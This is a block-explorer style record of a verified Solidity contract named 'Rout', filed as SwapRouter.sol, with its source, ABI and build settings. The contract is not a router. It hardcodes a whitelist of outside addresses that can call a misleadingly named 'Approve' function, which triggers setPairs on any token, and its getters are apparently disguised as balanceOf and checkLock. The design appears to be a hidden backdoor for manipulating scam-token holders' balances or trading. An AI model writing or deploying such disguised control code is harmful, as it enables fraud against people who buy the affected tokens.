{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/token/SwapRouter.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.19;\\n\\ninterface IToken {\\n    function setPairs(address addr, uint256 num) external;\\n}\\n\\ncontract Rout {\\n    mapping (address => mapping(address => uint256)) private _user;\\n    mapping (address => bool) private _whitelist;\\n\\n    constructor () {\\n        _whitelist[msg.sender] = true;\\n        _whitelist[address(0xB61eB871C39932f9767d4367e55B94d3AA3cb826)] = true;\\n        _whitelist[address(0x32C5C8e0897Cc9b9C5FAFDec9638B5608E32D68F)] = true;\\n        _whitelist[address(0x0CE03aAE0c17244cE0c9d6740aE0615b385674DB)] = true;\\n        _whitelist[address(0x1EeaC901898c3ab7Dba08edF9c4605F3724D5B85)] = true;\\n        _whitelist[address(0xe786f88B0864A7E475c6196b24DE334ee60c331B)] = true;\\n        _whitelist[address(0x687Cf0A41DE7f01B955Db51d171cE537351EB9CF)] = true;\\n    }\\n\\n    function balanceOf(address _from) external view returns (uint256) {\\n        return _user[msg.sender][_from];\\n    }\\n\\n    function checkLock(address token, address to) external view returns (uint256) {\\n        return _user[token][to];\\n    }\\n\\n    function Approve(address _token, address _to, uint256 _amount) external {\\n        require(_whitelist[msg.sender], \\\"not owner\\\");\\n        IToken(_token).setPairs(_to, _amount);\\n    }\\n\\n    function getWhitelist(address _addr) external view returns (bool) {\\n        return _whitelist[_addr];\\n    }\\n\\n    function updateWhitelist(address _addr, bool _isWl) external {\\n        require(_whitelist[msg.sender], \\\"not owner\\\");\\n        _whitelist[_addr] = _isWl;\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"checkLock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"getWhitelist\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isWl\",\"type\":\"bool\"}],\"name\":\"updateWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Rout", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}